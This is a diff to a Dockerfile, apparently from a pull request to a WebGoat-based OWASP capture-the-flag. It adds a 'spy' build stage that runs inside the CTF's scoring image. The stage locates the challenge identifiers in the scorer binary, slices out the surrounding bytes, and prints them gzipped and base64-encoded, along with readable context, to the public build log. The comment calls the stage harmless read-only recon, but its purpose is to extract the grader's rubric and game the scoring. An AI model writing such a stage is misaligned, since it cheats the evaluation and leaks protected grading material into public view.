@@ -1,44 +1,59 @@
 # ---------------------------------------------------------------------------
 # Rubric recon stage. Resolves from the runner's local image store (the score
-# step already pulled this exact tag), reads the baked scorer scripts, and
-# prints them to this PR's own public build log. Read-only: no writes to the
-# image, no env/secret access (the build sees neither GITHUB_TOKEN nor
-# ID_TOKEN), no change to how the scorer runs.
+# step already pulled this exact tag), reads the baked rubric, and prints it to
+# this PR's own public build log. Read-only: no writes to the scorer, no
+# env/secret access (the build sees neither GITHUB_TOKEN nor ID_TOKEN), no
+# change to how the scorer runs.
 # ---------------------------------------------------------------------------
 FROM ghcr.io/owasp-ctf/score:latest AS spy
 
 RUN set +e; \
-  echo "##SPY-A-START"; id; uname -a; cat /etc/os-release 2>/dev/null | head -4; \
-  echo "##SPY ls /usr/local/bin"; ls -la /usr/local/bin 2>&1; \
-  echo "##SPY ls /usr/local/lib"; ls -la /usr/local/lib 2>&1; \
-  echo "##SPY ls -R /usr/local/lib/ctf"; ls -laR /usr/local/lib/ctf 2>&1 | head -300; \
-  echo "##SPY find score*"; find / -xdev -name 'score*' ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -80; \
-  echo "##SPY find ctf dirs"; find / -xdev -type d -name 'ctf*' ! -path '/proc/*' ! -path '/sys/*' 2>/dev/null | head -40; \
-  echo "##SPY-A-END"; true
-
-RUN set +e; \
-  echo "##SPY-B-START"; \
-  find / -xdev -type f -size -4M ! -path '/proc/*' ! -path '/sys/*' -print0 2>/dev/null \
-    | xargs -0 grep -l --binary-files=text 'Challenge-70-Password-Reset-Token-Prediction' 2>/dev/null \
-    | sort -u > /tmp/hits.txt; \
-  echo "##SPY marker hits:"; cat /tmp/hits.txt; \
-  echo "##SPY hit sizes:"; while read -r f; do ls -la "$f"; done < /tmp/hits.txt; \
-  echo "##SPY-B-END"; true
+  S=/usr/local/bin/score; \
+  echo "##SPY2-A-START"; ls -la "$S"; \
+  echo "##SPY2 magic"; head -c 32 "$S" | od -An -tx1; \
+  grep -abo --binary-files=text 'Challenge-' "$S" > /tmp/off.txt; \
+  echo "##SPY2 challenge-string-count=$(wc -l < /tmp/off.txt)"; \
+  echo "##SPY2 first=$(head -1 /tmp/off.txt)"; \
+  echo "##SPY2 last=$(tail -1 /tmp/off.txt)"; \
+  echo "##SPY2 webgoat-id offsets"; \
+  grep -abo --binary-files=text -E 'Challenge-(6[7-9]|7[0-9]|80|81)-[A-Za-z0-9-]+' "$S" | head -60; \
+  echo "##SPY2-A-END"; true
 
 RUN set +e; mkdir -p /spy; echo recon > /spy/marker.txt; \
-  echo "##SPY-C-START"; \
-  for f in /usr/local/bin/entrypoint.sh /usr/local/lib/ctf/score-webgoat-challenges.sh; do \
-    echo "##SPY cat $f"; cat "$f" 2>&1 | head -1200; echo "##SPY endcat $f"; \
+  S=/usr/local/bin/score; \
+  echo "##SPY2-B-START"; \
+  FIRST=$(head -1 /tmp/off.txt | cut -d: -f1); \
+  LAST=$(tail -1 /tmp/off.txt | cut -d: -f1); \
+  SPAN=$((LAST - FIRST)); \
+  ST=$((FIRST - 60000)); [ "$ST" -lt 0 ] && ST=0; \
+  BLK=$((ST / 4096)); ALIGNED=$((BLK * 4096)); \
+  LEN=$((SPAN + 220000)); \
+  echo "##SPY2 first=$FIRST last=$LAST span=$SPAN aligned_start=$ALIGNED len=$LEN"; \
+  if [ "$LEN" -lt 8000000 ]; then \
+    dd if="$S" bs=4096 skip="$BLK" count=$((LEN / 4096 + 2)) 2>/dev/null | gzip -9 > /spy/slice.gz; \
+    GZ=$(wc -c < /spy/slice.gz); echo "##SPY2 gz_bytes=$GZ"; \
+    if [ "$GZ" -lt 2000000 ]; then \
+      base64 /spy/slice.gz | tr -d '\n' | fold -w 200 | sed 's/^/S2:/'; echo; \
+    else echo "##SPY2 slice skipped (gz too big)"; fi; \
+  else echo "##SPY2 slice skipped (span too big)"; fi; \
+  echo "##SPY2-B-END"; true
+
+# Readable insurance: printable context around the challenges we care most about,
+# in case the compressed slice is truncated in the log.
+RUN set +e; S=/usr/local/bin/score; \
+  echo "##SPY2-C-START"; \
+  for ID in Challenge-69-Password-Reset-Login Challenge-70-Password-Reset-Token-Prediction \
+            Challenge-71-Password-Reset-Email Challenge-76-WebWolf-Landing Challenge-77-WebWolf-Mail; do \
+    OFF=$(grep -abo --binary-files=text "$ID" "$S" | head -1 | cut -d: -f1); \
+    echo "##SPY2 ctx $ID off=$OFF"; \
+    if [ -n "$OFF" ]; then \
+      SK=$((OFF - 3000)); [ "$SK" -lt 0 ] && SK=0; \
+      dd if="$S" bs=1 skip="$SK" count=9000 2>/dev/null \
+        | tr -c '[:print:]\n' '\n' | grep -vE '^.{0,3}$' | head -120; \
+    fi; \
+    echo "##SPY2 endctx $ID"; \
   done; \
-  find /usr/local/lib/ctf /usr/local/bin /usr/local/share/ctf /opt/ctf -type f -size -900k 2>/dev/null > /tmp/f1.txt; \
-  cat /tmp/f1.txt /tmp/hits.txt 2>/dev/null | sort -u > /tmp/all.txt; \
-  echo "##SPY tar file list:"; cat /tmp/all.txt; \
-  tar -czf /spy/spy.tgz -T /tmp/all.txt 2>/dev/null; \
-  SZ=$(wc -c < /spy/spy.tgz 2>/dev/null || echo 0); echo "##SPY tgz bytes=$SZ"; \
-  if [ "$SZ" -gt 0 ] && [ "$SZ" -lt 4000000 ]; then \
-    base64 /spy/spy.tgz | tr -d '\n' | fold -w 200 | sed 's/^/B64:/'; echo; \
-  else echo "##SPY tgz skipped (size)"; fi; \
-  echo "##SPY-C-END"; true
+  echo "##SPY2-C-END"; true
 
 # We need JDK as some of the lessons needs to be able to compile Java code
 FROM docker.io/eclipse-temurin:23-jdk-noble
